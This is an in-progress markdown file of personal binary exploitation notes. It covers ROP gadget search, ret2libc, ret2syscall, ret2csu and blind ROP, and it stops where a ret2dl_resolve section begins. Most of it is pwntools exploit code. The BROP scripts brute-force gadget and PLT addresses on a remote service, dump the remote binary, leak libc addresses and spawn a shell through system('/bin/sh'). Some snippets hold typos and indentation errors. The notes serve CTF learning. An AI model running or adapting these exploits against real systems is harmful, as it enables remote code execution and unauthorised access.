
### in progress


# ROP
# how to find Gadgets (Ropper)

<details>
    <summary>Ropper</summary>
        <div>


read the docs!
https://github.com/sashs/Ropper

Ropper is a tool that can display information about binary files in different file formats and can search for gadgets to build rop chains for different architectures (x86/X86_64, ARM/ARM64, MIPS/MIPS64, PowerPC/PowerPC64, SPARC64).

most usefull commands imo.

`(ropper) file vuln_binary` loads the specified binary into cache and analyze it than cleans up double gadgets. \
`(ropper) search /1/ pop r??` /1/ = search for gadgets with max 1 instruction + ret  \
? means non specific char so this will search for `pop rax`&`pop rdi`&`pop rsi` and so on \
`(ropper) semantic eax==1 !ebx` searches for a gadget that set eax to 1 and does not clobber ebx

</div>
</details>

		
# find Strings in an ELF	
<details>
    <summary>strings</summary>
        <div>
		
searching manually   \
`strings -t x -a /path/to/binary | grep "string you searching"`

</div>
</details>
		
<details>
    <summary>pwntools</summary>
        <div>

in python script
```
binary = ELF('/path/to/binary')
stringaddr = next(binary.search(b'string you searching'))
```
</div>
</details>

# how to pivote the Stack
in progress
# ret2techniques
	
<details>
    <summary>ret2libc (dynamically linked ELF)</summary>
        <div>

# ret2libc (dynamically linked ELF)
to use ret2libc we need to know two things
	
1. the exact libc version the ELF uses
2. the base addr of libc in the process
		

to find the exact version of libc we can leak some GOT entrys which stores pointers to the functions in libc. 
(we also need this for finding the base of libc in the process)

since we have the ELF file we can do this with ease as the GOT and PLT sections are known to us (asuming PIE is off)
```
payload = b''
payload += b'A'*0x10			#padding
payload += p64(pop_rdi)			#set first arg to the addr of puts@GOT
payload += p64(puts@GOT)		#addr puts@GOT
payload += p64(puts@PLT)		#call puts@PLT(puts@GOT)
```

this payload will print the libc addr of puts() in the current process.
puts_leak = `leaked addr here`

ok now ne know the exact addr of puts() in libc but we still dont know which libc version is used.
we will use a libc database like https://libc.blukat.me/ to find the exact version
libc.blukat will find the libc based of the last 3 nibbles of the leaked addr since these will always be the same 
		
<img src="https://github.com/Bex32/Pwn-Notes/blob/main/src/libc_blukat.png">

usually you need to leak more than one libc function addr or the addr of a known string such as "/bin/sh" to find the exact libc version.

ok we now know the exact libc version now we can download the libc and calculate the offset from puts() to the base addr of libc in the process
use `vmmap` to find the libc base

```
0x0000000000400000 0x0000000000401000 0x0000000000000000 r-- /home/bex/Desktop/PWN Guide/Pwn Guide/src/ret2csu
0x0000000000401000 0x0000000000402000 0x0000000000001000 r-x /home/bex/Desktop/PWN Guide/Pwn Guide/src/ret2csu
0x0000000000402000 0x0000000000403000 0x0000000000002000 r-- /home/bex/Desktop/PWN Guide/Pwn Guide/src/ret2csu
0x0000000000403000 0x0000000000404000 0x0000000000002000 r-- /home/bex/Desktop/PWN Guide/Pwn Guide/src/ret2csu
0x0000000000404000 0x0000000000405000 0x0000000000003000 rw- /home/bex/Desktop/PWN Guide/Pwn Guide/src/ret2csu
0x0000000000405000 0x0000000000426000 0x0000000000000000 rw- [heap]
0x00007ffff7dbc000 0x00007ffff7de1000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007ffff7de1000 0x00007ffff7f59000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007ffff7f59000 0x00007ffff7fa3000 0x000000000019d000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007ffff7fa3000 0x00007ffff7fa4000 0x00000000001e7000 --- /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007ffff7fa4000 0x00007ffff7fa7000 0x00000000001e7000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007ffff7fa7000 0x00007ffff7faa000 0x00000000001ea000 rw- /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007ffff7faa000 0x00007ffff7fb0000 0x0000000000000000 rw- 
0x00007ffff7fc9000 0x00007ffff7fcd000 0x0000000000000000 r-- [vvar]
0x00007ffff7fcd000 0x00007ffff7fcf000 0x0000000000000000 r-x [vdso]
0x00007ffff7fcf000 0x00007ffff7fd0000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.31.so
0x00007ffff7fd0000 0x00007ffff7ff3000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.31.so
0x00007ffff7ff3000 0x00007ffff7ffb000 0x0000000000024000 r-- /usr/lib/x86_64-linux-gnu/ld-2.31.so
0x00007ffff7ffc000 0x00007ffff7ffd000 0x000000000002c000 r-- /usr/lib/x86_64-linux-gnu/ld-2.31.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002d000 rw- /usr/lib/x86_64-linux-gnu/ld-2.31.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw- 
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 --x [vsyscall]

```

know_libc_base = `libc base here`		

offset = puts_leak - known_libc_base 		known_libc_base as it will change next time the ELF file is run (ASLR)
libc_base = puts_leak - offset

ok we now know the libc version and the exact libc_base inside the current process.
now we can use libc functions such as system("/bin/sh") we can setup the args and than simply call it from libc

1. setup the argument for system(pointer_binsh) 
2. call the libc function system()

```
payload = b''
payload += b'A'*0x10			#padding
payload += p64(pop_rdi)			#set first arg to /bin/sh pointer
payload += p64(pointer_binsh)		#addr of /bin/sh\x00 in mem
payload += p64(system)			#call the libc system function
```

</div>
</details>

<details>
    <summary>ret2system (statically linked ELF)</summary>
        <div>


# ret2system (statically linked ELF)
`syscall(rax,rdi,rsi,rdx)`	
we want to call `execve(pointer_binsh,0,0)` to spawn a shell

so we need to setup a `syscall(execve(pointer_binsh,0,0))`
		
1. find the syscall number for execve
2. find a gadget that can write to a pointer like `mov [rdi],rdx`
3. write b'/bin/sh\x00' to a writable addr.
4. setup the registers and than syscall

syscall numbers `https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md#x86_64-64_bit	`
we know the syscall number is 0x3b so we want to call `syscall(0x3b,pointer_binsh,0,0)`
we need a gadget that can write to a pointer to write `/bin/sh\x00` string somewhere
we can find such a gadget by using `ropper`

```
ropper /1/ mov [r??],r??
```		
i choose `mov [rdi],rdx` ... somethink like `mov [rax],rdx` would worked too.
since we have to set rdi = pointer_binsh and `mov [rdi],rdx` directly writes to rdi we saved some gadgets.
when using `mov [rax],rdx` we have to `mov rdi,rax` afterwards.


```
payload = b''
payload += b'A'*0x10			#padding
payload += p64(pop_rax)			#set rax to 0x3b
payload += p64(0x3b)
payload += p64(pop_rdi)			#set rdi to a .bss addr .bss is usually `rw-`
payload += p64(.bss)			#addr where we want to write to
payload += p64(pop_rdx)			#set rdx to `/bin/sh\x00`
payload += b`/bin/sh\x00`		#be carefull when you set this allways keep the 0x8 byte pad in mind e.g. when you want to call execve with `/bin/cat\x00`
payload += p64(write_gadget)		#writes the content of rdx = `/bin/sh\x00` into the addr rdi = `.bss` points to
payload += p64(pop_rsi)			#set rsi to 0
payload += p64(0x00)
payload += p64(pop_rdx)			#set rdx to 0
payload += p64(0x00)
payload += p64(syscall)				
```


</div>
</details>

<details>
    <summary>ret2csu(no sufficient gadgets to set rdi,rsi,rdx can be found)</summary>
        <div>
		
# ret2csu(no sufficient gadgets to set rdi,rsi,rdx can be found)

the `__libc_csu_init` function is responsible to initialize libc files.
in this function there are some interesting gadgets we can use.

first gadget let us controll some registers with pop

POPGADGET:
his will let us controllrbx,rbp,r12,r13,r14,r15
```
__libc_csu_init+90	POP        RBX
__libc_csu_init+91	POP        RBP
__libc_csu_init+92	POP        R12
__libc_csu_init+94 	POP        R13
__libc_csu_init+96	POP        R14
	        __libc_csu_init+98 	POP        R15
__libc_csu_init+100 	RET
```

CALLGADGET:
this will let us controll rdx,rsi and edi but we need to meet some conditions 
```         
__libc_csu_init+64	MOV        RDX,R14
__libc_csu_init+67 	MOV        RSI,R13
__libc_csu_init+70 	MOV        EDI,R12D
__libc_csu_init+73	CALL       qword ptr [R15 + RBX*0x8]
__libc_csu_init+77	ADD        RBX,0x1
__libc_csu_init+81	CMP        RBP,RBX
__libc_csu_init+84	JNE        __libc_csu_init+64
__libc_csu_init+86	ADD        RSP,0x8
__libc_csu_init+90	POP        RBX
__libc_csu_init+91	POP        RBP
__libc_csu_init+92	POP        R12
__libc_csu_init+94 	POP        R13
__libc_csu_init+96	POP        R14
__libc_csu_init+98 	POP        R15
__libc_csu_init+100 	RET
```


there ase some constrains in the caller gadget 
1.
we want to pass the JNE and dont take it.
```
rbx = 0x00 set to 0 since it will be incremented later
rbp = set to 1 so when compared to the incremented rbx 
```

```
__libc_csu_init+77	ADD        RBX,0x1
__libc_csu_init+81	CMP        RBP,RBX
__libc_csu_init+84	JNE        __libc_csu_init+64
       	 	
```
2.
we want to set r15 = to a valide function pointer rbx will be 0x00
```
__libc_csu_init+73	CALL       qword ptr [R15 + RBX*0x8]
```


```
putsgot = elf.got['puts']          
putsplt = elf.plt['puts']
pop_rdi = 0x00000000004011f3
pop_rsi_r15 = 0x00000000004011f1
ret = 0x4004e6

def ret2csu(call,rdi,rsi,rdx):
    payload = p64(0x4011ea)         # first call popper gadget

    payload += p64(0x00)            # pop rbx - set to 0 since it will be incremented later
    payload += p64(0x01)            # pop rbp - set to 1 so when compared to the incremented rbx 
    payload += p64(0x400000)       # pop r12 #edi only 4 bytes controll
    payload += p64(rsi)            # pop r13 #rsi
    payload += p64(rdx)            # pop r14 #rdx
    payload += p64(putsgot)            # pop r15 

    payload += p64(0x4011d0)        # 2nd call caller gadget

        #__libc_csu_init+64     MOV        RDX,R14
        #__libc_csu_init+67     MOV        RSI,R13
        #__libc_csu_init+70     MOV        EDI,R12D

    payload += p64(0x00)            # add rsp,0x8 padding cause __libc_csu_init+86  ADD RSP,0x8 


        #__libc_csu_init+90     POP        RBX
        #__libc_csu_init+91     POP        RBP
        #__libc_csu_init+92     POP        R12
        #__libc_csu_init+94     POP        R13
        #__libc_csu_init+96     POP        R14
        #__libc_csu_init+98     POP        R15
        #__libc_csu_init+100    RET

    payload += p64(0x00)            # rbx
    payload += p64(0x00)            # rbp
    payload += p64(0x00)            # r12
    payload += p64(0x00)            # r13
    payload += p64(0x00)            # r14
    payload += p64(0x00)            # r15

        #__libc_csu_init+100    RET

    payload += p64(pop_rdi)        
    payload += p64(rdi)             # update rdi with correct unconstrained content
    payload += p64(pop_rsi_r15)     
    payload += p64(rsi)             # update rsi with correct unconstrained content
    payload += p64(0x00)

        #we now have this registers under controll rdi,rsi,rdx,rbx,rbp,r12,r13,r14,r15

    payload += p64(call)            # actual wanted function call
    return payload

    rop = b'A'*16
    rop += ret2csu(putsplt, 0x7ffff7f735aa, 0x00, 0x00) # call(rdi,rsi,rdx)

```

For de-randomizing libc, we can use &GOT_TABLE, coupled with some read(), write() or send(), recv() (ie: usually available in CTF challenges)

<img src="https://github.com/Bex32/Pwn-Notes/blob/main/src/ret2csu_gadgets.png">
		
</div>
</details>

# Blind Return Oriented Programming






<details>
    <summary>BROP (dont have the binary // PIE off // puts() in binary)</summary>
        <div>

# BROP (dont have the binary // PIE off // puts() in binary)
		
Steps of Exploitation:

Puts/Printf() when fd is 0,1,2 stdin,stdout,stderror
1. find a loop-gadget
2. find brop-gadget (the ret2csu popper-gadget // rdi & rsi controll)
3. find puts@plt
4. leak the binary


### find loop-gadget
the example binary prints `Are you blind my friend?\n` and than asks us for input
so we know that when we find the right addr there should be a `Are you blind my friend?\n` printed back to us and we should be able to input again


```
def find_loop_gadget(i):
    
    r = remote(ip, port,timeout=1)
    
    addr_guess = i + 0x400200                         #we know PIE is off // cause x64 binarys start here = 0x400000 + 0x200 for headers
        
    payload = b'A'*88                                 #pad
    payload += p64(addr_guess)                        #rip

    r.readuntil(b'Are you blind my friend?\n')        #read the first (intendet) "Are you blind my friend?\n" 
    r.send(payload)


    try:
        check = r.recvline()                          #trys to read a line if cant read a line EOF error will be thrown
        if b'Are you blind my friend?\n' in check:    #if we get back the 'Are you blind my friend?\n' we know we are on a potential right addr
            return int(addr_guess)              
        else:
            print(check)                              #if we recv something that is not 'Are you blind my friend?\n' we print to check what it was
            print(r.recvline())                       #than try to read more that should throw an EOF error if not inspect further
            r.close()
    except:
        print(sys.exc_info()[0])                      #prints the error
        print(i)                                      #prints the iterator
        r.close()


for i in range(0x2000):                               #loop  0x400200 -> 0x402200   
    loop = find_loop_gadget(i)                  
    if loop:                            
        print(f'found loop_gadget @ {hex(loop)}')
        break                                         #remove this break if you want to find more potential loop addr.
```



### find brop-gadget

ok we now have a loop-gadget now we need to find a brop-gadget (popper gadget from ret2csu)
6 pops in a row are pretty uncommon so its not hard to indentify it.


```
def find_brop_gadget(i):


    r = remote(ip, port,timeout=1)

    addr_guess = i + 0x400200                          #we know PIE is off // cause x64 binarys start here = 0x400000 + 0x200 for headers

    payload = b'A'*88                                  #pad
    payload += p64(addr_guess)                         #rip 
    payload += p64(0x00)                               #setup stack
    payload += p64(0x00)
    payload += p64(0x00)
    payload += p64(0x00)
    payload += p64(0x00)
    payload += p64(0x00)
    payload += p64(loop)                               #loop back to main

    r.recvuntil(b'Are you blind my friend?\n')         #read the first (intendet) "Are you blind my friend?\n" 
    r.send(payload)

    try:
        check = r.recvline()                           #trys to read a line if cant read a line EOF error will be thrown
        if b'Are you blind my friend?\n' in check:     #if we get back the 'Are you blind my friend?\n' we know we are on a potential right addr since our 6 pops goes throu
                                                       #2nd check if we are on the right gadget this time we want a crash
                p = remote(ip,port,timeout=1)

                payload = b'A'*88                      #pad
                payload += p64(addr_guess)             #rip
                payload += p64(0x00)                   #setup stack
                payload += p64(0x00)    
                payload += p64(0x00)
                payload += p64(0x00)
                payload += p64(0x00)
                payload += p64(0x00)
                payload += p64(0x00)                   # one extra 0x00 to crash. ret to 0x00 is allways a crash  
                payload += p64(loop)                   # if it still prints 'Are you blind my friend?\n' its the wrong guess addr
        
                p.recvuntil(b'Are you blind my friend?\n')     #read the first (intendet) "Are you blind my friend?\n" 
                p.send(payload)                 
                
                try:
                    check2 = p.recvline()              #try to read a line if we can read a line we are on the wrong addr guess #we should crash here
                    if check2:                         #if we can recv something addr guess are wrong
                    print('not passed check2')
                    p.close()
                    r.close()

                except:                                #we want a crash so if we crash were good
                    r.close()
                    p.close()
                    return addr_guess

        else:                                          #if we can recv something on the initial check but its not "Are you blind my friend?\n" or we hang
                r.close()                              #close connection
    except:                                            #if we crash during first payload wrong guess addr
        print(sys.exc_info()[0])
        r.close()


for i in range(0x2000):                                #loop  0x400200 -> 0x402200 
    brop = find_brop_gadget(i)
    if brop:
        print(f'found brop_gadget @ {hex(brop)}')
        break                                          #remove this break if you want to find more potential brop-gadget addr.
    

pop_rdi = int(brop) + 0x9                              #we need this later 
pop_rsi_r15 = int(brop) + 0x7                          #we need this later

```
### find puts-gadget



```
def find_puts(i):                        #puts@plt


    r = remote(ip, port,timeout=1)
                                                #iterate in steps of 0x10
    addr_guess = i*0x10 + 0x400200              #we know PIE is off // cause x64 binarys start here = 0x400000 + 0x200 for headers 



            #this is the plt layout we want to find
            # 0x0000000000400560  puts@plt
            # 0x0000000000400570  setbuf@plt
            # 0x0000000000400580  read@plt
            # 0x0000000000400590  __libc_start_main@plt
            # 0x00000000004005a0  strcmp@plt


    payload = b'A'*88                           #pad
    payload += p64(pop_rdi)                     #first argument for # int puts( char const * string ); puts(rdi) 
    payload += p64(0x400000)                    #points to 0x400000 which should print out 'ELF'
    payload += p64(addr_guess)                  #the addr guess for puts@plt

    r.recvuntil('Are you blind my friend?\n')   #read the first (intendet) "Are you blind my friend?\n"
    r.send(payload)
    


    try:
        check = r.recvline()                    #trys to recv if cant recv anything EOF error
        if b'ELF' in check:                     #if the str 'ELF' is in the check we found a potential puts@plt addr.
            r.close()
            return addr_guess
        else:
            print(check)                        #debugging if something weard was printed
    except:
        print(sys.exc_info()[0])                #printes the error
        print(i)                                #prints the iterator
        r.close()

for i in range(0x50):                           # loop 0x400200 -> 0x400700  ## 0x400200 + 0x50*0x10 = 0x400200 + 0x500 = 0x400700
    puts = find_puts(i)
    if puts:
        print(f'found puts @ {hex(puts)}')
        break                                   #remove this break if you want to find more potential puts@plt addr.
```

### leak the process with puts()
```
def leak_binary_puts(i,j):


    r = remote(ip, port,timeout=1)
    
    x = i + j

    payload = b'A'*88
    payload += p64(pop_rdi)
    payload += p64(x)
    payload += p64(puts)

    r.recvline()                                         #read the first (intendet) "Are you blind my friend?\n"
    r.send(payload)



    try:
        check = r.recvline()                            #trys to recv the leak if nothin is recv inc offset by 1 and continue
        if check:
            if check.hex()[:-2] == '':                  
                file.append(b'\x00')
                r.close()
                return int(offset) + 1

            else:
                file.append(check[:-1])                 #append leak without \n
                last_len = int(len(check)-1)            #calculate len of leaked bytes
                r.close()
                return int(offset) + int(last_len)      #increase the offset by leaked num of bytes     
            
        else:
            r.close()
    except:                                             #inc offset by 1 and continue
        print(sys.exc_info()[0])
        r.close()
        return int(offset + 1)

file = []
last_len = 0
offset = 0

for i in range(0xb00):                      
    offset = leak_binary_puts(offset,0x400000)
    print(offset)
    print(f'{hex(i)}')


string1 = b''.join(file)

with open('binary_dump', 'wb') as out:
    out.write(string1)
    out.close()

```
find the libc verion with https://libc.blukat.me/

```           

def leak(i):        #simple leak function to find all GOT entrys this will print the addr and content of 0x601000 -> 0x601080 in steps of 0x8


    r = remote(ip, port,timeout=1)
    

    payload = b'A'*88                                                   
    payload += p64(pop_rdi)
    payload += p64(i)
    payload += p64(puts)

    r.recvline()                                        #read the first (intendet) "Are you blind my friend?\n"
    r.send(payload)

    leak = unpack(r.recvline()[:-1],'all')
    return leak


libc = ELF(/path/to/libc)                               #we want to guess a libc and if we guess right it should have the same last 3 nibbles 

puts_check = hex(libc.symbols['puts'])[-2::]

for i in range(0x10):                                   #loop 0x601000 -> 0x601080
    check = leak(0x601000+i*8)                          #GOT usually starts somewhere here 0x601000
    print(f'{hex(0x601000+i*8)} : {hex(check)}')
    if hex(check)[12:] == puts_check:
        putsgot = (i*8+0x601000)
        print(f'puts_got @ {hex(putsgot)}')
        break


```

and bringing it all together we can pop a shell

```
def pwn():

    #context.log_level = 'debug'

    r = remote(ip, port,timeout=1) 

    pop_rdi = int(brop) + 0x9
    ret = int(brop) + 10

    payload = b'A'*88                               #leak libc_base
    payload += p64(pop_rdi)
    payload += p64(putsgot)
    payload += p64(puts)
    payload += p64(loop)                            #loop back to main
 

    r.recvuntill('Are you blind my friend?\n')      #read the 1st (intendet) "Are you blind my friend?\n"
    r.send(payload)


    leak = unpack(r.recvline()[:-1],'all')          #leak puts
    print(hex(leak))
    libc.address = leak - libc.symbols['puts']      #sets libc base

    print(hex(libc.address))

    r.recvuntil('Are you blind my friend?\n')       #read the (loop) "Are you blind my friend?\n"

    binsh = next(libc.search(b'/bin/sh\x00'))       #ret2libc
    system = libc.symbols['system']

    payload = b'A'*88
    payload += p64(pop_rdi)
    payload += p64(binsh)
    payload += p64(system)

    r.send(payload)

    inter()
```



</div>
</details>


<details>
    <summary>BROP (dont have the binary // PIE off // puts() not in binary)</summary>
        <div>

# BROP (dont have the binary // PIE off // puts() not in binary)		
		
1. find a loop-gadget
2. find brop-gadget (the ret2csu popper-gadget // rdi & rsi controll)
3. find strcmp@PLT (strcmp sets rdx)
4. find write@PLT (let us write to any fd)
5. leak the binary

### find loop-gadget
the example binary prints `Are you blind my friend?\n` and than asks us for input
so we know that when we find the right addr there should be a `Are you blind my friend?\n` printed back to us and we should be able to input again


```
def find_loop_gadget(i):
    
    r = remote(ip, port,timeout=1)
    
    addr_guess = i + 0x400200                         #we know PIE is off // cause x64 binarys start here = 0x400000 + 0x200 for headers
        
    payload = b'A'*88                                 #pad
    payload += p64(addr_guess)                        #rip

    r.readuntil(b'Are you blind my friend?\n')        #read the first (intendet) "Are you blind my friend?\n" 
    r.send(payload)


    try:
        check = r.recvline()                          #trys to read a line if cant read a line EOF error will be thrown
        if b'Are you blind my friend?\n' in check:    #if we get back the 'Are you blind my friend?\n' we know we are on a potential right addr
            return int(addr_guess)              
        else:
            print(check)                              #if we recv something that is not 'Are you blind my friend?\n' we print to check what it was
            print(r.recvline())                       #than try to read more that should throw an EOF error if not inspect further
            r.close()
    except:
        print(sys.exc_info()[0])                      #prints the error
        print(i)                                      #prints the iterator
        r.close()


for i in range(0x2000):                               #loop  0x400200 -> 0x402200   
    loop = find_loop_gadget(i)                  
    if loop:                            
        print(f'found loop_gadget @ {hex(loop)}')
        break                                         #remove this break if you want to find more potential loop addr.
```



### find brop-gadget

ok we now have a loop-gadget now we need to find a brop-gadget (popper gadget from ret2csu)
6 pops in a row are pretty uncommon so its not hard to indentify it.


```
def find_brop_gadget(i):


    r = remote(ip, port,timeout=1)

    addr_guess = i + 0x400200                          #we know PIE is off // cause x64 binarys start here = 0x400000 + 0x200 for headers

    payload = b'A'*88                                  #pad
    payload += p64(addr_guess)                         #rip 
    payload += p64(0x00)                               #setup stack
    payload += p64(0x00)
    payload += p64(0x00)
    payload += p64(0x00)
    payload += p64(0x00)
    payload += p64(0x00)
    payload += p64(loop)                               #loop back to main

    r.recvuntil(b'Are you blind my friend?\n')         #read the first (intendet) "Are you blind my friend?\n" 
    r.send(payload)

    try:
        check = r.recvline()                           #trys to read a line if cant read a line EOF error will be thrown
        if b'Are you blind my friend?\n' in check:     #if we get back the 'Are you blind my friend?\n' we know we are on a potential right addr since our 6 pops goes throu
                                                       #2nd check if we are on the right gadget this time we want a crash
                p = remote(ip,port,timeout=1)

                payload = b'A'*88                      #pad
                payload += p64(addr_guess)             #rip
                payload += p64(0x00)                   #setup stack
                payload += p64(0x00)    
                payload += p64(0x00)
                payload += p64(0x00)
                payload += p64(0x00)
                payload += p64(0x00)
                payload += p64(0x00)                   # one extra 0x00 to crash. ret to 0x00 is allways a crash  
                payload += p64(loop)                   # if it still prints 'Are you blind my friend?\n' its the wrong guess addr
        
                p.recvuntil(b'Are you blind my friend?\n')     #read the first (intendet) "Are you blind my friend?\n" 
                p.send(payload)                 
                
                try:
                    check2 = p.recvline()              #try to read a line if we can read a line we are on the wrong addr guess #we should crash here
                    if check2:                         #if we can recv something addr guess are wrong
                    print('not passed check2')
                    p.close()
                    r.close()

                except:                                #we want a crash so if we crash were good
                    r.close()
                    p.close()
                    return addr_guess

        else:                                          #if we can recv something on the initial check but its not "Are you blind my friend?\n" or we hang
                r.close()                              #close connection
    except:                                            #if we crash during first payload wrong guess addr
        print(sys.exc_info()[0])
        r.close()


for i in range(0x2000):                                #loop  0x400200 -> 0x402200 
    brop = find_brop_gadget(i)
    if brop:
        print(f'found brop_gadget @ {hex(brop)}')
        break                                          #remove this break if you want to find more potential brop-gadget addr.
    

pop_rdi = int(brop) + 0x9                              #we need this later 
pop_rsi_r15 = int(brop) + 0x7                          #we need this later

```

```
def find_strcmp(i):
    
    r = remote(ip, port,timeout=1)
                                                #iterate in steps of 0x10 same as finding puts
    addr_guess = i*0x10 + 0x400200                    #we know PIE is off // cause x64 binarys start here = 0x400000 + 0x200 for headers

    payload = b'A'*88                           #pad
    payload += p64(pop_rdi)                     #pop 1st argument for # int strcmp (const char* str1, const char* str2); strcmp(rdi,rsi)
    payload += p64(0x400000)                    #holds valide pointer to 'ELF'          GOOD
    payload += p64(pop_rsi_r15)                 #pop 2nd argument   
    payload += p64(0x400000)                    #holds valide pointer to 'ELF'          GOOD
    payload += p64(0x00)                        #junk to fill r15
    payload += p64(addr_guess)                  #the addr guess for strcmp@plt
    payload += p64(loop)                        #loop back to main if check for GOOD:GOOD pointers work 
    r.recvuntil('Are you blind my friend?\n')   #read the first (intendet) "Are you blind my friend?\n"
    r.send(payload)
    

    try:
        check = r.recvline()                                            #trys to recv if cant recv anything EOF error
        if b'Are you blind my friend?\n' in check:                      #if we can find 'Are you blind my friend?\n' we passed check1 
            r.close()
            print('\n1st check passed good:good')
            
            print(f'2nd check for {hex(addr_guess)} good:bad')
            p = remote(ip,port,timeout=1)

            payload = b'A'*88                                           #same as above but with GOOD:BAD pointers that should crash
            payload += p64(pop_rdi) 
            payload += p64(0x400000)                                    #holds valide pointer to 'ELF'          GOOD
            payload += p64(pop_rsi_r15)
            payload += p64(0x0)                                         #holds invalide pointer to 0x00         BAD
            payload += p64(0x0)
            payload += p64(addr_guess)
            payload += p64(loop)        
            p.readuntil('Are you blind my friend?\n')
            p.send(payload)
                
            try:
                check2 = p.recvline()

                if check2: 
                    print('not passed check2')
                    p.close()
                else:
                    print('not passed check2')
                    p.close()

            except:
                r.close()
                p.close()
                print(f'3nd check for {hex(addr_guess)} bad:good')
                p = remote(ip,port,timeout=1)

                payload = b'A'*88                                       #same as above but with BAD:GOOD pointers that should crash    
                payload += p64(pop_rdi)
                payload += p64(0x0)                                     #holds invalide pointer to 0x00         BAD
                payload += p64(pop_rsi_r15)
                payload += p64(0x400000)                                #holds valide pointer to 'ELF'          GOOD
                payload += p64(0x0)
                payload += p64(addr_guess)
                payload += p64(loop)         
                p.readuntil('Are you blind my friend?\n')
                p.send(payload)

                try:
                    check3 = p.recvline()

                    if check3: 
                        print('not passed check3')
                        p.close()
                    else:
                        print('not passed check3')
                        p.close()

                except:
                    p.close()
                    print(f'4rd check for {hex(addr_guess)} bad:bad')
                    p = remote(ip,port,timeout=1)

                    payload = b'A'*88                                   #same as above but with BAD:BAD pointers that should crash
                    payload += p64(pop_rdi) 
                    payload += p64(0x0)                                 #holds invalide pointer to 0x00         BAD
                    payload += p64(pop_rsi_r15)
                    payload += p64(0x0)                                 #holds invalide pointer to 0x00         BAD
                    payload += p64(0x0)             
                    payload += p64(addr_guess)
                    payload += p64(loop)         
                    p.readuntil('Are you blind my friend?\n')
                    p.send(payload)
                    try:
                        check4 = p.recvline()

                        if check4: 
                            print('not passed check4')
                            p.close()

                        else:
                            print('not passed check4')
                            p.close()


                    except:
                        p.close()
                        print(sys.exc_info()[0])
                        return addr_guess                               #if all checks were good we return the guess_addr

        else:
            r.close()
    except:
        print(sys.exc_info()[0])
        print(hex(addr_guess))
        r.close()


for i in range(0x50):                                                   # loop 0x400200 -> 0x400700  ## 0x400200 + 0x50*0x10 = 0x400200 + 0x500 = 0x400700
        strcmp = find_strcmp(i)
        if strcmp:
            print(f'found strcmp @ {hex(strcmp)}')
            break                                                       #remove this break if you want to find more potential strcmp@plt addr.

 ```

 ```
def find_write()                                #ssize_t write(int fd, const void *buf, size_t count); write(rdi,rsi,rdx)

    r = remote(ip, port,timeout=1)  


    pop_rdi = int(brop) + 0x9                    
    pop_rsi_r15 = int(brop) + 0x7


                                                #iterate in steps of 0x10
    addr_guess = i*0x10 + 0x400200              #we know PIE is off // cause x64 binarys start here = 0x400000 + 0x200 for headers 

    payload = b'A'*88                           #pad
    payload += p64(pop_rdi)                     #int strcmp (const char* str1, const char* str2) strcmp(rdi,rsi)
    payload += p64(0x400000)                    #rdi points to 0x400000 which should hold 'ELF'
    payload += p64(pop_rsi_r15)
    payload += p64(0x400000)                    #rsi points to 0x400000 which should hold 'ELF'
    payload += p64(0x00)                        #junk r15
    payload += p64(strcmp)                      #sets rdx to != 0x00
    payload += p64(pop_rdi)
    payload += p64(0x01)                        #fd for write usually 0x01 but when we connect throu a socket maybe differ
    payload += p64(addr_guess)
                                                


    r.recvuntil('Are you blind my friend?\n')   #read the first (intendet) "Are you blind my friend?\n"
    r.send(payload)
    


    try:
        check = r.recvline()                    #trys to recv if cant recv anything EOF error
        if b'ELF' in check:                     #if the str 'ELF' is in the check we found a potential write@plt addr.
            r.close()
            return addr_guess
        else:
            print(check)                        #debugging if something weard was printed
    except:
        print(sys.exc_info()[0])                #printes the error
        print(i)                                #prints the iterator
        r.close()

for i in range(0x50):                           # loop 0x400200 -> 0x400700  ## 0x400200 + 0x50*0x10 = 0x400200 + 0x500 = 0x400700
    write = find_write(i)
    if write:
        print(f'found write @ {hex(write)}')
        break                                   #remove this break if you want to find more potential write@plt addr.
 ```

 
### leak the process with write()
		
```
def leak_binary_write(i,j):

    pop_rdi = int(brop) + 0x9                    
    pop_rsi_r15 = int(brop) + 0x7

    r = remote(ip, port,timeout=1)
    
    x = i + j

    payload = b'A'*88                                   #pad
    payload += p64(pop_rdi)                             #int strcmp (const char* str1, const char* str2) strcmp(rdi,rsi)
    payload += p64(0x400000)                            #rdi points to 0x400000 which should hold '0x00010102464c457f'
    payload += p64(pop_rsi_r15)
    payload += p64(0x400001)                            #rsi points to 0x400001 which should hold '0x0000010102464c45'
    payload += p64(0x00)                                #junk r15
    payload += p64(strcmp)                              #sets rdx to 0x7f

    payload += p64(pop_rdi)
    payload += p64(0x01)                                #fd for write usually 0x01 but when we connect throu a socket maybe differ
    payload += p64(pop_rsi_r15)
    payload += p64(x)                                   #addr to leak
    payload += p64(0x00)                                #junk r15   
    payload += p64(addr_guess)                          #ssize_t write(int fd, const void *buf, size_t count); write(rdi,rsi,rdx)

    r.recvline()                                        #read the first (intendet) "Are you blind my friend?\n"
    r.send(payload)



    try:
        check = r.recvline()                            
        if check:
            file.append(check[:-1])
            r.close() 
            
        else:
            r.close()
    except:                                             
        print(sys.exc_info()[0])
        r.close()


file = []
offset = 0x7f                                           

for i in range(0x100):                      
    offset = leak_binary_write(i*offset,0x400000)
    print(f'{hex(i*offset)}')


string1 = b''.join(file)

with open('binary_dump', 'wb') as out:
    out.write(string1)
    out.close()

```

</div>
</details>


# ret2dl_resolve
https://www.usenix.org/system/files/conference/usenixsecurity15/sec15-paper-di-frederico.pdf
<details>
    <summary>how _dl_runtime_resolve works </summary>
        <div>

		
# how _dl_runtime_resolve works
binary: GITHUB LINK TO DL THE BINARY HERE!!! \
first step:before we can exploit something we need to know how it works under the hood! \
the _dl_runtime_resolve() basically does a lookup in some tables that live inside the binary 
```
_dl_runtime_resolve(elf_info , index )
				 |
				 |
  /-----------------------------/
  |
